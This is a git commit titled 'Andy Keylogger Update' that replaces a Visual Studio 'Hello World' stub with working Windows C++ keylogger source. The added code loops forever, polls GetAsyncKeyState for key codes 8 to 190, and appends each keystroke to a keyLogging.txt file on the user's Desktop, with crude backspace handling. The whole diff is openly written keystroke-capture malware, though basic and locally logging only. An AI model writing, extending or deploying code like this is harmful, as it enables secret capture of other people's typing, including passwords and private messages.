55252adf5f4519a440514563e256844da5265f1b
AndyHuang321 <agentpie123@gmail.com>
2023-05-19 14:32:43 -0700

    Andy Keylogger Update

--- Components/Keylogger/Keylogger.cpp
+++ Components/Keylogger/Keylogger.cpp
@@ -1,20 +1,69 @@
-// Keylogger.cpp : This file contains the 'main' function. Program execution begins and ends there.
-//
-
 #include <iostream>
+#include <fstream>
+#include <windows.h>
+#include <Lmcons.h>
+#include <stdlib.h>
+#include <string.h>
+
+
+std::string getFilePath()
+{
+    TCHAR username[UNLEN + 1];
+    DWORD size = UNLEN + 1;
+    GetUserName((TCHAR*)username, &size);
+
+	std::string strtmp(&username[0], &username[(int)size-1]);
+
+	std::string path = "C:\\Users\\" + strtmp + "\\Desktop\\keyLogging.txt";
+
+	std::cout << path;
+
+    return path;
+}
+
+bool clickedSpecialKey(int key, std::ofstream& logFile) 
+{
+	if (key == VK_BACK)
+	{
+		long currentPosition = logFile.tellp();
+		logFile.seekp(currentPosition - 2);
+		logFile.write("", 1);
+		logFile.close();
+		return true;
+	}
+	if (key == VK_CAPITAL)
+	{
+		return true;
+	}
+	return false;
+}
+
+
 
 int main()
 {
-    std::cout << "Hello World!\n";
+    std::string path = getFilePath();
+	 
+    std::ofstream logFile(path);
+
+	char keyPress = 'k';
+
+	while (true) {
+		Sleep(10);
+		for (int keyPress = 8; keyPress <= 190; keyPress++)
+		{
+			if (GetAsyncKeyState(keyPress) == -32767) 
+			{
+				logFile.open(path, std::fstream::app);
+				if (clickedSpecialKey(keyPress, logFile) == false)
+				{
+					logFile << char(keyPress);
+					logFile.close();
+				}
+			}
+		}
+	}
+
+    return 0; 
 }
 
-// Run program: Ctrl + F5 or Debug > Start Without Debugging menu
-// Debug program: F5 or Debug > Start Debugging menu
-
-// Tips for Getting Started: 
-//   1. Use the Solution Explorer window to add/manage files
-//   2. Use the Team Explorer window to connect to source control
-//   3. Use the Output window to see build output and other messages
-//   4. Use the Error List window to view errors
-//   5. Go to Project > Add New Item to create new code files, or Project > Add Existing Item to add existing code files to the project
-//   6. In the future, to open this project again, go to File > Open > Project and select the .sln file
